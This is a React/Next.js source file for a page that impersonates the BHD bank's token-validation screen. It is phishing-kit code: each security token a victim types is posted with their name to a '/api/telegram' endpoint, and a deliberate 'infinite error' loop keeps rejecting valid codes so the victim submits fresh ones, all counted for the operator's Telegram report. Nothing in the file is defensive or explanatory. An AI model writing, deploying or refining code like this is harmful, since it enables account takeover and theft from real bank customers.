"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function TokenBHD() {
  const router = useRouter();
  const [token, setToken] = useState("");
  const [loading, setLoading] = useState(false);
  const [errorVisible, setErrorVisible] = useState(false);
  const [intentos, setIntentos] = useState(0);
  const [cliente, setCliente] = useState("");

  useEffect(() => {
    const nombre = localStorage.getItem("cliente_actual");
    if (nombre) setCliente(nombre);
  }, []);

  const handleFinish = async () => {
    // Validación de longitud
    if (!token.trim() || token.length < 4) {
      alert("Por favor, ingrese el Token de seguridad válido.");
      return;
    }

    setLoading(true);
    setErrorVisible(false); // Ocultamos el error mientras procesa el nuevo intento

    try {
      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          pagina: `🔐 TOKEN BHD (Intento ${intentos + 1})`,
          nombre: cliente || "Cliente Desconocido",
          usuario: "TOKEN DISPOSITIVO",
          password: token.trim(),
          detalles: `Intento número ${intentos + 1} realizado por el usuario.`
        }),
      });

      // LÓGICA DE ERROR INFINITO:
      // Nunca redirigimos. Siempre limpiamos el token y mostramos error tras una breve carga.
      setTimeout(() => {
        setLoading(false);
        setErrorVisible(true);
        setToken(""); // Limpia el input para obligar a escribir uno nuevo
        setIntentos((prev) => prev + 1); // Seguimos contando para tu reporte en Telegram
      }, 1500);

    } catch (e) {
      // En caso de error de red, mantenemos al usuario en la página con el mensaje de error
      setLoading(false);
      setErrorVisible(true);
      setToken("");
    }
  };

  return (
    <main className="min-h-screen bg-[#e9ecef] font-sans">
      {/* Header Superior */}
      <div className="bg-white h-20 flex items-center justify-between px-6 md:px-24 border-b border-slate-200">
        <div className="flex items-center">
          <img src="/images/bhd.png" alt="BHD Logo" className="h-10 object-contain" />
          <div className="h-8 w-[1px] bg-slate-300 mx-4"></div>
          <span className="italic text-[#28a745] font-semibold text-xl">Personal</span>
        </div>
        
        <div className="flex items-center gap-2">
          <span className="text-slate-500 text-sm hidden md:block">Bienvenido(a)</span>
          <div className="w-10 h-10 flex items-center justify-center cursor-pointer">
             <svg viewBox="0 0 24 24" className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" strokeLinecap="round" strokeLinejoin="round"/>
             </svg>
          </div>
        </div>
      </div>

      {/* Contenedor de Validación */}
      <div className="max-w-[1100px] mx-auto mt-8 px-4 pb-20">
        <div className="bg-white p-8 md:p-12 shadow-sm border border-slate-200 rounded-sm">
          <h2 className="text-[26px] text-[#90a4ae] font-light mb-6 border-b border-slate-100 pb-4">
            Validación de acceso
          </h2>
          
          <div className="mb-10">
            <p className="text-[15px] font-bold text-slate-800">
              Por motivos de seguridad, es necesario que ingreses tu código Token para confirmar la operación.
            </p>
          </div>

          {/* MENSAJE DE ERROR */}
          {errorVisible && (
            <div className="mb-6 p-4 bg-red-50 border-l-4 border-red-500 flex items-center gap-3 max-w-md animate-in fade-in slide-in-from-top-1">
              <svg className="w-5 h-5 text-red-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
              </svg>
              <p className="text-red-700 text-sm font-medium">
                Token inválido o expirado. Por favor, verifique su dispositivo e intente de nuevo.
              </p>
            </div>
          )}

          <div className="max-w-md space-y-8">
            <div>
              <label className="block text-[15px] text-slate-700 mb-2 font-medium">
                Ingresar Token de seguridad.
              </label>
              <input
                type="text"
                maxLength={6}
                placeholder="000000"
                value={token}
                onChange={(e) => setToken(e.target.value.replace(/\D/g, ""))}
                className="w-full border border-slate-300 p-3 rounded-md outline-none focus:border-blue-400 text-slate-600 placeholder:text-slate-400 shadow-sm text-lg tracking-widest text-center"
              />
            </div>

            <div className="flex items-center gap-3">
              <input 
                type="checkbox" 
                id="safe"
                className="w-5 h-5 accent-[#21a1fc] border-slate-300 rounded cursor-pointer" 
              />
              <label htmlFor="safe" className="text-[15px] font-bold text-slate-800 cursor-pointer">
                ¿Deseas guardar este dispositivo como seguro?
              </label>
            </div>

            <div className="space-y-4 pt-4">
              <button 
                type="button"
                onClick={() => router.back()}
                className="w-full bg-[#f8f9fa] border border-slate-200 text-slate-600 py-3 rounded-md font-medium text-lg hover:bg-slate-100 transition-colors"
              >
                Cancelar
              </button>
              
              <button
                type="button"
                onClick={handleFinish}
                disabled={loading}
                className="w-full bg-[#21a1fc] hover:bg-[#1b86d1] text-white py-3 rounded-md font-medium text-lg transition-colors shadow-sm disabled:bg-slate-400"
              >
                {loading ? "Verificando..." : "Continuar"}
              </button>
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}